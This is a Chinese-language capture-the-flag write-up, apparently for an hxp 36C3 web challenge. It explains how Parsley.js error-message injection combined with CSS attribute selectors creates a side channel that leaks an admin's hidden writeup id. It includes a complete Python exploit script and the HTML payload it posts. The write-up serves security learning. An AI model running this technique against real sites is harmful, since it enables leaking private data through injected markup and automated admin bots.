<h6 id="既然flag在数据库当中，那我们可以首先来看看show-php，因为这个文件可以直接用来获取writeup的内容。"><a href="#既然flag在数据库当中，那我们可以首先来看看show-php，因为这个文件可以直接用来获取writeup的内容。" class="headerlink" title="既然flag在数据库当中，那我们可以首先来看看show.php，因为这个文件可以直接用来获取writeup的内容。"></a>既然flag在数据库当中，那我们可以首先来看看show.php，因为这个文件可以直接用来获取writeup的内容。</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">'../general.php'</span>;</span><br><span class="line"></span><br><span class="line">$stmt = $db-&gt;prepare(<span class="string">'SELECT id, content FROM `writeup` WHERE `id` = ?'</span>);</span><br><span class="line">$stmt-&gt;bind_param(<span class="string">'s'</span>, $_GET[<span class="string">'id'</span>]);</span><br><span class="line">$stmt-&gt;execute();</span><br><span class="line">$writeup = mysqli_fetch_all($stmt-&gt;get_result(), MYSQLI_ASSOC)[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$stmt = $db-&gt;prepare(<span class="string">'SELECT user_id FROM `like` WHERE `writeup_id` = ?'</span>);</span><br><span class="line">$stmt-&gt;bind_param(<span class="string">'s'</span>, $_GET[<span class="string">'id'</span>]);</span><br><span class="line">$stmt-&gt;execute();</span><br><span class="line">$result = $stmt-&gt;get_result();</span><br><span class="line">$likes = mysqli_fetch_all($result, MYSQLI_ASSOC);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">'../views/header.php'</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">'../views/show.php'</span>);</span><br></pre></td></tr></table></figure>

<h6 id="我们可以看到id并没有什么鉴权措施，也就是说，我们可以通过writeup-id来获取writeup内容，而flag-writeup-id在admin用户数据当中，而在header-php中可以看到当前用户所有的writeup-id"><a href="#我们可以看到id并没有什么鉴权措施，也就是说，我们可以通过writeup-id来获取writeup内容，而flag-writeup-id在admin用户数据当中，而在header-php中可以看到当前用户所有的writeup-id" class="headerlink" title="我们可以看到id并没有什么鉴权措施，也就是说，我们可以通过writeup id来获取writeup内容，而flag writeup id在admin用户数据当中，而在header.php中可以看到当前用户所有的writeup id"></a>我们可以看到id并没有什么鉴权措施，也就是说，我们可以通过writeup id来获取writeup内容，而flag writeup id在admin用户数据当中，而在header.php中可以看到当前用户所有的writeup id</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">foreach</span>($writeups <span class="keyword">as</span> $w): <span class="meta">?&gt;</span></span><br><span class="line">  &lt;li&gt;&lt;a href=<span class="string">"/show.php?id=&lt;?= $w['id'] ?&gt;"</span>&gt;Writeup - <span class="meta">&lt;?</span>= $w[<span class="string">'id'</span>] <span class="meta">?&gt;</span>&lt;/a&gt;&lt;/li&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">endforeach</span>; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h6 id="既然有提交代码给admin的功能，那么是不是有可能是一个xss或者什么的？"><a href="#既然有提交代码给admin的功能，那么是不是有可能是一个xss或者什么的？" class="headerlink" title="既然有提交代码给admin的功能，那么是不是有可能是一个xss或者什么的？"></a>既然有提交代码给admin的功能，那么是不是有可能是一个xss或者什么的？</h6><h6 id="我们还可以看到admin在收到writeup后的主要操作："><a href="#我们还可以看到admin在收到writeup后的主要操作：" class="headerlink" title="我们还可以看到admin在收到writeup后的主要操作："></a>我们还可以看到admin在收到writeup后的主要操作：</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">display = Display(visible=<span class="number">0</span>, size=(<span class="number">800</span>, <span class="number">600</span>))</span><br><span class="line">display.start()</span><br><span class="line">chrome_options = Options()</span><br><span class="line">chrome_options.add_argument(<span class="string">'--disable-gpu'</span>)</span><br><span class="line">chrome_options.add_argument(<span class="string">'--headless'</span>)</span><br><span class="line">chrome_options.add_argument(<span class="string">'--no-sandbox'</span>)</span><br><span class="line">driver = webdriver.Chrome(<span class="string">'/usr/bin/chromedriver'</span>, options=chrome_options)</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://admin:__ADMIN_TOKEN__@127.0.0.1/login_admin.php?id='</span>+writeup_id</span><br><span class="line">driver.get(url)</span><br><span class="line">element = driver.find_element_by_xpath(<span class="string">'//input[@id="like"]'</span>)</span><br><span class="line">element.click()</span><br><span class="line"></span><br><span class="line">driver.quit()</span><br><span class="line">display.stop()</span><br></pre></td></tr></table></figure>

<h6 id="我们可以看到admin在进行登陆之后使用find-element-by-xpath找到了id为like的input标签，并进行了点击，也就是提交给admin的writeup后，admin会浏览进行点击，发送一个点赞请求"><a href="#我们可以看到admin在进行登陆之后使用find-element-by-xpath找到了id为like的input标签，并进行了点击，也就是提交给admin的writeup后，admin会浏览进行点击，发送一个点赞请求" class="headerlink" title="我们可以看到admin在进行登陆之后使用find_element_by_xpath找到了id为like的input标签，并进行了点击，也就是提交给admin的writeup后，admin会浏览进行点击，发送一个点赞请求"></a>我们可以看到admin在进行登陆之后使用<code>find_element_by_xpath</code>找到了id为like的input标签，并进行了点击，也就是提交给admin的writeup后，admin会浏览进行点击，发送一个点赞请求</h6><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">action</span>=<span class="string">"/like.php"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"c"</span> <span class="attr">value</span>=<span class="string">"&lt;?= $_SESSION['c'] ?&gt;"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"id"</span> <span class="attr">value</span>=<span class="string">"&lt;?= $writeup['id'] ?&gt;"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">"like"</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"👍"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h6 id="接着我们来看看general-php中的防御措施"><a href="#接着我们来看看general-php中的防御措施" class="headerlink" title="接着我们来看看general.php中的防御措施"></a>接着我们来看看general.php中的防御措施</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start([<span class="string">'cookie_httponly'</span> =&gt; <span class="keyword">true</span>, <span class="string">'cookie_samesite'</span> =&gt; <span class="string">'Strict'</span>]);</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">id</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> bin2hex(random_bytes(<span class="number">8</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$nonce = base64_encode(id());</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">header(<span class="string">'x-xss-protection: 1; mode=block'</span>);</span><br><span class="line">header(<span class="string">'X-Content-Type-Options: nosniff'</span>);</span><br><span class="line">header(<span class="string">'x-frame-options: DENY'</span>);</span><br><span class="line">header(<span class="string">'Referrer-Policy: no-referrer'</span>);</span><br><span class="line">header(<span class="string">"Feature-Policy: geolocation 'none'; midi 'none'; sync-xhr 'none'; microphone 'none'; camera 'none'; magnetometer 'none'; gyroscope 'none'; speaker 'none'; fullscreen 'none'; payment 'none'; usb 'none'; vr 'none'; encrypted-media 'none'"</span>);</span><br><span class="line">header(<span class="string">"Content-Security-Policy: default-src 'none'; script-src 'nonce-"</span>.$nonce.<span class="string">"' https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.0/jquery.min.js https://cdnjs.cloudflare.com/ajax/libs/parsley.js/2.8.2/parsley.min.js; base-uri 'self'; form-action 'self'; frame-ancestors 'none'; require-sri-for script style;"</span>);</span><br></pre></td></tr></table></figure>

<h6 id="而script-src设置的nonce只能在header-php使用了，而且我们也拿不到这个nonce"><a href="#而script-src设置的nonce只能在header-php使用了，而且我们也拿不到这个nonce" class="headerlink" title="而script-src设置的nonce只能在header.php使用了，而且我们也拿不到这个nonce"></a>而<code>script-src</code>设置的nonce只能在header.php使用了，而且我们也拿不到这个nonce</h6><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">nonce</span>=<span class="string">"&lt;?=$nonce?&gt;"</span>&gt;</span></span><br><span class="line"><span class="javascript">    $(<span class="string">'#publish-form'</span>).parsley() <span class="comment">// prevent hacking</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h6 id="所以我们可能需要往点击事件那一方面思考，并且利用题目引入的两个-js-文件入手，一个-jquery-js-，另一个-parsley-js。"><a href="#所以我们可能需要往点击事件那一方面思考，并且利用题目引入的两个-js-文件入手，一个-jquery-js-，另一个-parsley-js。" class="headerlink" title="所以我们可能需要往点击事件那一方面思考，并且利用题目引入的两个 js 文件入手，一个 jquery.js ，另一个 parsley.js。"></a>所以我们可能需要往点击事件那一方面思考，并且利用题目引入的两个 js 文件入手，一个 jquery.js ，另一个 parsley.js。</h6><h6 id="Parsley-js"><a href="#Parsley-js" class="headerlink" title="Parsley.js"></a>Parsley.js</h6><h6 id="我们可以去parsley-js-doc看到该lib的简单说明以及使用："><a href="#我们可以去parsley-js-doc看到该lib的简单说明以及使用：" class="headerlink" title="我们可以去parsley.js doc看到该lib的简单说明以及使用："></a>我们可以去<a href="https://parsleyjs.org/doc/index.html" target="_blank" rel="noopener">parsley.js doc</a>看到该lib的简单说明以及使用：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Parsley is a javascript form validation library. It helps you provide your users with feedback on their form submission before sending it to your server. It saves you bandwidth, server load and it saves time for your users.</span><br><span class="line"></span><br><span class="line">Javascript form validation is not necessary, and if used, it does not replace strong backend server validation.</span><br><span class="line"></span><br><span class="line">That’s why Parsley is here: to let you define your general form validation, implement it on the backend side, and simply port it frontend-side, with maximum respect to user experience best practices.</span><br></pre></td></tr></table></figure>

<h6 id="可以看出这是个简单的前端验证库，简单查一下文档，我们可以发现有几个有意思的-API："><a href="#可以看出这是个简单的前端验证库，简单查一下文档，我们可以发现有几个有意思的-API：" class="headerlink" title="可以看出这是个简单的前端验证库，简单查一下文档，我们可以发现有几个有意思的 API："></a>可以看出这是个简单的前端验证库，简单查一下文档，我们可以发现有几个有意思的 API：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">data-parsley-trigger=”input”</span><br><span class="line"></span><br><span class="line">Specify one or many javascript events that will trigger item validation, before any failure. To set multiple events, separate them with a space data-parsley-trigger=”focusin focusout”. Default is null. See the various events supported by jQuery.</span><br><span class="line"></span><br><span class="line">data-parsley-error-message=”my message”</span><br><span class="line"></span><br><span class="line">Customize a unique global message for the field.</span><br><span class="line"></span><br><span class="line">data-parsley-errors-container=”#element”</span><br><span class="line"></span><br><span class="line">Specify the existing DOM container where ParsleyUI should put the errors. It is also possible to configure it with a callback function from javascript, see the annotated source.</span><br></pre></td></tr></table></figure>

<h6 id="根据文档，我们可以利用data-parsley-trigger设置我们的触发方式，使用data-parsley-error-message来自定义我们的错误信息，使用data-parsley-errors-container来自定义我们的显示错误的位置。"><a href="#根据文档，我们可以利用data-parsley-trigger设置我们的触发方式，使用data-parsley-error-message来自定义我们的错误信息，使用data-parsley-errors-container来自定义我们的显示错误的位置。" class="headerlink" title="根据文档，我们可以利用data-parsley-trigger设置我们的触发方式，使用data-parsley-error-message来自定义我们的错误信息，使用data-parsley-errors-container来自定义我们的显示错误的位置。"></a>根据文档，我们可以利用<code>data-parsley-trigger</code>设置我们的触发方式，使用<code>data-parsley-error-message</code>来自定义我们的错误信息，使用<code>data-parsley-errors-container</code>来自定义我们的显示错误的位置。</h6><h6 id="根据文档，我们可以简单用一个data-parsley-validate指定我们需要验证的表单，然后利用错误信息把元素标签输出出来，并且我们接着还可以利用指定输出位置来控制输出，例如："><a href="#根据文档，我们可以简单用一个data-parsley-validate指定我们需要验证的表单，然后利用错误信息把元素标签输出出来，并且我们接着还可以利用指定输出位置来控制输出，例如：" class="headerlink" title="根据文档，我们可以简单用一个data-parsley-validate指定我们需要验证的表单，然后利用错误信息把元素标签输出出来，并且我们接着还可以利用指定输出位置来控制输出，例如："></a>根据文档，我们可以简单用一个<code>data-parsley-validate</code>指定我们需要验证的表单，然后利用错误信息把元素标签输出出来，并且我们接着还可以利用指定输出位置来控制输出，例如：</h6><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">data-parsley-validate</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> </span></span><br><span class="line"><span class="tag">            <span class="attr">data-parsley-trigger</span>=<span class="string">"blur"</span> <span class="attr">autofocus</span> <span class="attr">name</span>=<span class="string">"some-field"</span></span></span><br><span class="line"><span class="tag">            <span class="attr">data-parsley-error-message</span>=<span class="string">"&lt;input id=like type=button value=padyload&gt;"</span> </span></span><br><span class="line"><span class="tag">            <span class="attr">data-parsley-required</span></span></span><br><span class="line"><span class="tag">            <span class="attr">data-parsley-errors-container</span>=<span class="string">"#div1"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h6 id="data-parsley-trigger指定了blur事件，也就是当我们的-input-失焦时，会显示我们的错误信息，并且在-id-为-div1-的元素中显示，更重要的是，浏览器也将其进行了渲染。"><a href="#data-parsley-trigger指定了blur事件，也就是当我们的-input-失焦时，会显示我们的错误信息，并且在-id-为-div1-的元素中显示，更重要的是，浏览器也将其进行了渲染。" class="headerlink" title="data-parsley-trigger指定了blur事件，也就是当我们的 input 失焦时，会显示我们的错误信息，并且在 id 为 div1 的元素中显示，更重要的是，浏览器也将其进行了渲染。"></a><code>data-parsley-trigger</code>指定了<code>blur</code>事件，也就是当我们的 input 失焦时，会显示我们的错误信息，并且在 id 为 div1 的元素中显示，更重要的是，浏览器也将其进行了渲染。</h6><p><img src="https://raw.githubusercontent.com/ljdd520/images/master/img/hxp-363c-ctf-2019-10.png" alt></p>
<h6 id="Click"><a href="#Click" class="headerlink" title="Click"></a>Click</h6><h6 id="回到题目当中，admin-所做的动作有两个，一个就是登录，根据题目信息，我们基本上对这个操作没办法进行什么干扰，另外一个就是点赞了，更具体来说就是通过-show-php-打开你的-writeup-内容，并且点击页面上-id-为-like-的-input-标签，所以我们更可能的事对点赞操作进行一个干扰或者其他的操作，并且根据实际测试，通过selenium-webdriver调用find-element-by-xpath函数得到的-id-为-like-的-input-元素只能有第一个，也就是说，即使我们在-writeup-内容中插入一个-id-为-like-的-input-标签，admin-也只会根据页面顺序拿到第一个点赞-input-。"><a href="#回到题目当中，admin-所做的动作有两个，一个就是登录，根据题目信息，我们基本上对这个操作没办法进行什么干扰，另外一个就是点赞了，更具体来说就是通过-show-php-打开你的-writeup-内容，并且点击页面上-id-为-like-的-input-标签，所以我们更可能的事对点赞操作进行一个干扰或者其他的操作，并且根据实际测试，通过selenium-webdriver调用find-element-by-xpath函数得到的-id-为-like-的-input-元素只能有第一个，也就是说，即使我们在-writeup-内容中插入一个-id-为-like-的-input-标签，admin-也只会根据页面顺序拿到第一个点赞-input-。" class="headerlink" title="回到题目当中，admin 所做的动作有两个，一个就是登录，根据题目信息，我们基本上对这个操作没办法进行什么干扰，另外一个就是点赞了，更具体来说就是通过 show.php 打开你的 writeup 内容，并且点击页面上 id 为 like 的 input 标签，所以我们更可能的事对点赞操作进行一个干扰或者其他的操作，并且根据实际测试，通过selenium.webdriver调用find_element_by_xpath函数得到的 id 为 like 的 input 元素只能有第一个，也就是说，即使我们在 writeup 内容中插入一个 id 为 like 的 input 标签，admin 也只会根据页面顺序拿到第一个点赞 input 。"></a>回到题目当中，admin 所做的动作有两个，一个就是登录，根据题目信息，我们基本上对这个操作没办法进行什么干扰，另外一个就是点赞了，更具体来说就是通过 show.php 打开你的 writeup 内容，并且点击页面上 id 为 like 的 input 标签，所以我们更可能的事对点赞操作进行一个干扰或者其他的操作，并且根据实际测试，通过<code>selenium.webdriver</code>调用<code>find_element_by_xpath</code>函数得到的 id 为 like 的 input 元素只能有第一个，也就是说，即使我们在 writeup 内容中插入一个 id 为 like 的 input 标签，admin 也只会根据页面顺序拿到第一个点赞 input 。</h6><h6 id="并且-CSP-也限制得很严格，似乎陷入了僵局，但是如果我们有以上-parsley-js-的知识，我们似乎可以通过错误信息来构造一些-Payload-。"><a href="#并且-CSP-也限制得很严格，似乎陷入了僵局，但是如果我们有以上-parsley-js-的知识，我们似乎可以通过错误信息来构造一些-Payload-。" class="headerlink" title="并且 CSP 也限制得很严格，似乎陷入了僵局，但是如果我们有以上 parsley.js 的知识，我们似乎可以通过错误信息来构造一些 Payload 。"></a>并且 CSP 也限制得很严格，似乎陷入了僵局，但是如果我们有以上 parsley.js 的知识，我们似乎可以通过错误信息来构造一些 Payload 。</h6><h6 id="首先，因为find-element-by-xpath只会得到第一个-id-为-like-的-input-标签，而我们通过-parsley-js-可以将错误信息输出到指定页面位置，所以我们大概可以有一个想法，把一个没有用的单独的-id-为-like-的-input-标签插入到原来的点赞按钮之前。"><a href="#首先，因为find-element-by-xpath只会得到第一个-id-为-like-的-input-标签，而我们通过-parsley-js-可以将错误信息输出到指定页面位置，所以我们大概可以有一个想法，把一个没有用的单独的-id-为-like-的-input-标签插入到原来的点赞按钮之前。" class="headerlink" title="首先，因为find_element_by_xpath只会得到第一个 id 为 like 的 input 标签，而我们通过 parsley.js 可以将错误信息输出到指定页面位置，所以我们大概可以有一个想法，把一个没有用的单独的 id 为 like 的 input 标签插入到原来的点赞按钮之前。"></a>首先，因为<code>find_element_by_xpath</code>只会得到第一个 id 为 like 的 input 标签，而我们通过 parsley.js 可以将错误信息输出到指定页面位置，所以我们大概可以有一个想法，把一个没有用的单独的 id 为 like 的 input 标签插入到原来的点赞按钮之前。</h6><h6 id="但是这有什么用呢？我们再来仔细看看-admin-要点赞的那个页面"><a href="#但是这有什么用呢？我们再来仔细看看-admin-要点赞的那个页面" class="headerlink" title="但是这有什么用呢？我们再来仔细看看 admin 要点赞的那个页面"></a>但是这有什么用呢？我们再来仔细看看 admin 要点赞的那个页面</h6><p><img src="https://raw.githubusercontent.com/ljdd520/images/master/img/hxp-363c-ctf-2019-11.png" alt></p>
<h6 id="页面上部分是-header-php-，会展示当前用户所提交的-writeup-，也就是说-admin-的这个页面，第一个也是唯一一个-a-标签就是-flag-的地址，现在的问题就变成了我们怎么获取这个地址的问题了，更详细的来说，我们如何获取这个-a-标签中的-href-属性值，或者更确切的说就是获取-writeup-id-的事情了。"><a href="#页面上部分是-header-php-，会展示当前用户所提交的-writeup-，也就是说-admin-的这个页面，第一个也是唯一一个-a-标签就是-flag-的地址，现在的问题就变成了我们怎么获取这个地址的问题了，更详细的来说，我们如何获取这个-a-标签中的-href-属性值，或者更确切的说就是获取-writeup-id-的事情了。" class="headerlink" title="页面上部分是 header.php ，会展示当前用户所提交的 writeup ，也就是说 admin 的这个页面，第一个也是唯一一个 a 标签就是 flag 的地址，现在的问题就变成了我们怎么获取这个地址的问题了，更详细的来说，我们如何获取这个 a 标签中的 href 属性值，或者更确切的说就是获取 writeup id 的事情了。"></a>页面上部分是 header.php ，会展示当前用户所提交的 writeup ，也就是说 admin 的这个页面，第一个也是唯一一个 a 标签就是 flag 的地址，现在的问题就变成了我们怎么获取这个地址的问题了，更详细的来说，我们如何获取这个 a 标签中的 href 属性值，或者更确切的说就是获取 writeup id 的事情了。</h6><h6 id="CSS-Selector"><a href="#CSS-Selector" class="headerlink" title="CSS Selector"></a>CSS Selector</h6><h6 id="如何获取-a-标签中的-href-属性值貌似也就跟我们之前提到的data-parsley-errors-container-API有关了，而这个-API-又支持-CSS-选择器，那我们是不是可以通过-CSS-选择器来让我们的报错信息放到这个-a-标签之后呢，这样以来也就直接就放到了点赞按钮之前了。"><a href="#如何获取-a-标签中的-href-属性值貌似也就跟我们之前提到的data-parsley-errors-container-API有关了，而这个-API-又支持-CSS-选择器，那我们是不是可以通过-CSS-选择器来让我们的报错信息放到这个-a-标签之后呢，这样以来也就直接就放到了点赞按钮之前了。" class="headerlink" title="如何获取 a 标签中的 href 属性值貌似也就跟我们之前提到的data-parsley-errors-container API有关了，而这个 API 又支持 CSS 选择器，那我们是不是可以通过 CSS 选择器来让我们的报错信息放到这个 a 标签之后呢，这样以来也就直接就放到了点赞按钮之前了。"></a>如何获取 a 标签中的 href 属性值貌似也就跟我们之前提到的<code>data-parsley-errors-container</code> API有关了，而这个 API 又支持 CSS 选择器，那我们是不是可以通过 CSS 选择器来让我们的报错信息放到这个 a 标签之后呢，这样以来也就直接就放到了点赞按钮之前了。</h6><h6 id="类似之前-XCTF-Final-一个-CSS-侧信道的题目，我们可以通过利用a-href-39-show-php-id-flag-的形式来进行元素选择。"><a href="#类似之前-XCTF-Final-一个-CSS-侧信道的题目，我们可以通过利用a-href-39-show-php-id-flag-的形式来进行元素选择。" class="headerlink" title="类似之前 XCTF Final 一个 CSS 侧信道的题目，我们可以通过利用a[href^=&#39;/show.php?id={flag}]的形式来进行元素选择。"></a>类似之前 XCTF Final 一个 CSS 侧信道的题目，我们可以通过利用<code>a[href^=&#39;/show.php?id={flag}]</code>的形式来进行元素选择。</h6><h6 id="也就是说，当我们传入的-flag-值与页面中的-href-属性值也就是-writeup-id-前部分完全匹配的时候，我们可以把一个无效的-id-like-input-标签插入到该-a-标签之后，亦即真正用于提交-like-请求的-input-标签之前；如果我们传入的-flag-值与页面中的-href-属性值也就是-writeup-id-前部分不完全匹配的，parsley-js-什么也不会做，admin-会正常地点赞，我们可以正常地在自己的-writeup-页面看到-admin-的点赞。"><a href="#也就是说，当我们传入的-flag-值与页面中的-href-属性值也就是-writeup-id-前部分完全匹配的时候，我们可以把一个无效的-id-like-input-标签插入到该-a-标签之后，亦即真正用于提交-like-请求的-input-标签之前；如果我们传入的-flag-值与页面中的-href-属性值也就是-writeup-id-前部分不完全匹配的，parsley-js-什么也不会做，admin-会正常地点赞，我们可以正常地在自己的-writeup-页面看到-admin-的点赞。" class="headerlink" title="也就是说，当我们传入的 flag 值与页面中的 href 属性值也就是 writeup id 前部分完全匹配的时候，我们可以把一个无效的 id=like input 标签插入到该 a 标签之后，亦即真正用于提交 like 请求的 input 标签之前；如果我们传入的 flag 值与页面中的 href 属性值也就是 writeup id 前部分不完全匹配的，parsley.js 什么也不会做，admin 会正常地点赞，我们可以正常地在自己的 writeup 页面看到 admin 的点赞。"></a>也就是说，当我们传入的 flag 值与页面中的 href 属性值也就是 writeup id 前部分完全匹配的时候，我们可以把一个无效的 id=like input 标签插入到该 a 标签之后，亦即真正用于提交 like 请求的 input 标签之前；如果我们传入的 flag 值与页面中的 href 属性值也就是 writeup id 前部分不完全匹配的，parsley.js 什么也不会做，admin 会正常地点赞，我们可以正常地在自己的 writeup 页面看到 admin 的点赞。</h6><h6 id="所以基于这个差异，我们可以利用这种形式来进行一个侧信道攻击获取-flag-的-writeup-id。"><a href="#所以基于这个差异，我们可以利用这种形式来进行一个侧信道攻击获取-flag-的-writeup-id。" class="headerlink" title="所以基于这个差异，我们可以利用这种形式来进行一个侧信道攻击获取 flag 的 writeup id。"></a>所以基于这个差异，我们可以利用这种形式来进行一个侧信道攻击获取 flag 的 writeup id。</h6><h6 id="脚本编写也比较简单："><a href="#脚本编写也比较简单：" class="headerlink" title="脚本编写也比较简单："></a>脚本编写也比较简单：</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line"></span><br><span class="line">base_url = <span class="string">"http://ip:8001/"</span></span><br><span class="line"></span><br><span class="line">res = s.get(base_url)</span><br><span class="line"></span><br><span class="line">pos = res.text.find(<span class="string">'name="c" value="'</span>) + len(<span class="string">'name="c" value="'</span>)</span><br><span class="line">csrftoken = res.text[pos:pos+<span class="number">16</span>]</span><br><span class="line"></span><br><span class="line">ss = <span class="string">"1234567890abcdef"</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> ss:</span><br><span class="line">        payload = <span class="string">f"&lt;form data-parsley-validate&gt;&lt;input data-parsley-required data-parsley-trigger=\"blur\" data-parsley-error-message='&lt;input type=\"input\" id=like value=\"rebirth_is_really_nb\"&gt;' data-parsley-errors-container=\"a[href^='/show.php?id=<span class="subst">&#123;flag + j&#125;</span>']\" autofocus&gt;&lt;/form&gt;"</span></span><br><span class="line">        data = &#123;<span class="string">'c'</span>: csrftoken, <span class="string">'content'</span>: payload&#125;</span><br><span class="line">        res = s.post(base_url + <span class="string">"add.php"</span>, data=data, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">        <span class="comment"># print(res.headers)</span></span><br><span class="line">        location = res.headers[<span class="string">'Location'</span>]</span><br><span class="line">        pos = location.find(<span class="string">'id='</span>) + <span class="number">3</span></span><br><span class="line">        wp = location[pos:]</span><br><span class="line">        data = &#123;<span class="string">'c'</span>: csrftoken, <span class="string">'id'</span>: wp&#125;</span><br><span class="line">        res = s.post(base_url + <span class="string">"admin.php"</span>, data=data)</span><br><span class="line">        time.sleep(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">        res = s.get(<span class="string">f"http://ip:8001/show.php?id=<span class="subst">&#123;wp&#125;</span>"</span>)</span><br><span class="line">        <span class="comment"># print(res.text)</span></span><br><span class="line">        txt = res.text.replace(<span class="string">"\n"</span>, <span class="string">""</span>).replace(<span class="string">"\r"</span>, <span class="string">""</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"Liked by&lt;/h3&gt;admin"</span> <span class="keyword">not</span> <span class="keyword">in</span> txt:</span><br><span class="line">            flag += j</span><br><span class="line">            print(i,flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<h6 id="拿到-writeup-id-之后直接访问即可："><a href="#拿到-writeup-id-之后直接访问即可：" class="headerlink" title="拿到 writeup id 之后直接访问即可："></a>拿到 writeup id 之后直接访问即可：</h6><p><img src="https://raw.githubusercontent.com/ljdd520/images/master/img/hxp-363c-ctf-2019-12.png" alt></p>
